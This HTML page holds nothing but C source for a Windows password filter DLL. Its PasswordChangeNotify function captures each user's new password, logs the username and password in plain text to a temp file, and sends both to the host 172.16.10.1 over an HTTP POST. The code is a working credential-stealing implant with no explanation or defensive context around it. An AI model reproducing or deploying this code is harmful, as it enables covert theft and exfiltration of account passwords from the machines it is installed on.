<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Code</title>
</head><body>#include &lt;windows.h&gt;<br/>
#include &lt;stdio.h&gt;<br/>
#include &lt;WinInet.h&gt;<br/>
#include &lt;ntsecapi.h&gt;<br/>
<br/>
void writeToLog(const char* szString)<br/>
{<br/>
&nbsp; &nbsp; FILE* pFile = fopen("c:\\windows\\temp\\logFile.txt", "a+");<br/>
&nbsp; &nbsp; if (NULL == pFile)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return;<br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; fprintf(pFile, "%s\r\n", szString);<br/>
&nbsp; &nbsp; fclose(pFile);<br/>
&nbsp; &nbsp; return;<br/>
}<br/>
<br/>
<br/>
<br/>
// Default DllMain implementation<br/>
BOOL APIENTRY DllMain( HANDLE hModule, <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DWORD &nbsp;ul_reason_for_call, <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;LPVOID lpReserved<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;)<br/>
{<br/>
&nbsp; &nbsp; OutputDebugString(L"DllMain");<br/>
&nbsp; &nbsp; switch (ul_reason_for_call)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; case DLL_PROCESS_ATTACH:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; case DLL_THREAD_ATTACH:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; case DLL_THREAD_DETACH:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; case DLL_PROCESS_DETACH:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;<br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; return TRUE;<br/>
}<br/>
<br/>
BOOLEAN __stdcall InitializeChangeNotify(void)<br/>
{<br/>
&nbsp; &nbsp; OutputDebugString(L"InitializeChangeNotify");<br/>
&nbsp; &nbsp; writeToLog("InitializeChangeNotify()");<br/>
&nbsp; &nbsp; return TRUE;<br/>
}<br/>
<br/>
BOOLEAN __stdcall PasswordFilter(<br/>
&nbsp; &nbsp; PUNICODE_STRING AccountName,<br/>
&nbsp; &nbsp; PUNICODE_STRING FullName,<br/>
&nbsp; &nbsp; PUNICODE_STRING Password,<br/>
&nbsp; &nbsp; BOOLEAN SetOperation )<br/>
{<br/>
&nbsp; &nbsp; OutputDebugString(L"PasswordFilter");<br/>
&nbsp; &nbsp; return TRUE;<br/>
}<br/>
<br/>
NTSTATUS __stdcall PasswordChangeNotify(<br/>
&nbsp; &nbsp; PUNICODE_STRING UserName,<br/>
&nbsp; &nbsp; ULONG RelativeId,<br/>
&nbsp; &nbsp; PUNICODE_STRING NewPassword )<br/>
{<br/>
&nbsp; FILE* pFile = fopen("c:\\windows\\temp\\logFile.txt", "a+");<br/>
&nbsp; //HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);<br/>
&#09;HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);<br/>
&#09;HINTERNET hSession = InternetConnect(hInternet,L"172.16.10.1",80,NULL,NULL,INTERNET_SERVICE_HTTP ,0,0);<br/>
&#09;HINTERNET hReq = HttpOpenRequest(hSession,L"POST",L"/",NULL,NULL,NULL,0,0);<br/>
&#09;char* pBuf="SomeData";<br/>
<br/>
<br/>
<br/>
&#09;OutputDebugString(L"PasswordChangeNotify");<br/>
&#09;if (NULL == pFile)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return;<br/>
&nbsp; &nbsp; }<br/>
&#09;fprintf(pFile, "%ws:%ws\r\n", UserName-&gt;Buffer,NewPassword-&gt;Buffer);<br/>
&nbsp; fclose(pFile);<br/>
&#09;InternetSetOption(hSession,INTERNET_OPTION_USERNAME,UserName-&gt;Buffer,UserName-&gt;Length/2);<br/>
&#09;InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,NewPassword-&gt;Buffer,NewPassword-&gt;Length/2);<br/>
&#09;HttpSendRequest(hReq,NULL,0,pBuf,strlen(pBuf));<br/>
<br/>
&nbsp; &nbsp; return 0;<br/>
}</body></html>